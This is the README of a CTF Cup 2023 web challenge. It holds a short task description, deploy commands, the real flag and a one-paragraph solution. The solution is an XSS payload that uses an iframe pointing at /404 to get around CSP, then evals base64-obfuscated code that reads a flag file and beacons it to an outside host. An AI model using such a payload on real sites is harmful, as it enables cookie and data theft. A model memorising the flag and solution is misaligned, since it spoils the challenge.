# web | novosti

![novosti share page](./screenshots/novosti.png)

## Information

Даже в такие тяжёлые времена, как сейчас, людям нужна информация. Мы решили запустить свой новостной сайт, но только так, чтобы об этом не узнали сам-знаешь-кто. Надеемся, очевидцы будут присылать нам новости, чтобы было, что публиковать. Не самим же искать анонсы, в самом-то деле...

Even in hard times like these, people need information. We have decided to start our own news site, but only so that you-know-who doesn't find out about it. We hope that eyewitnesses will send us news so that we have something to publish. It's not like we have to look for announcements ourselves, really....

[https://novosti-3d5d54b8c9f9f81aabcf60563021845f.ctfcup-2023.ru](https://novosti-3d5d54b8c9f9f81aabcf60563021845f.ctfcup-2023.ru)

## Deploy

```sh
cd deploy
NOVOSTI_FLAG="ctfcup{flag}" docker compose -p web-novosti up --build -d
```

## Public

Provide zip file: [public/novosti.zip](public/novosti.zip).

## TLDR

XSS, use iframe leading to 404 in order to bypass CSP

```html
<script>
  const iframe = document.createElement("iframe");
  iframe.src = "/404";
  document.body.appendChild(iframe);
  setTimeout(() => {
    iframe.contentWindow.document.body.innerHTML = `<img src=x onerror="eval(atob('ZmV0Y2goImh0dHA6Ly9maWxlczo4MDgwL2ZsYWciKS50aGVuKHI9PnIudGV4dCgpKS50aGVuKHQ9Pm5hdmlnYXRvci5zZW5kQmVhY29uKCJodHRwOi8vcmVuYm91LnJ1Iix0KSk7'))" />`;
  }, 1000);
</script>
```

## Writeup (ru)

TODO

## Writeup (en)

TODO

## Domain

https://novosti-3d5d54b8c9f9f81aabcf60563021845f.ctfcup-2023.ru

## Cloudflare

Yes

## Flag

ctfcup{b4by-1fr4m3-x55-a4371ea843fc145f}
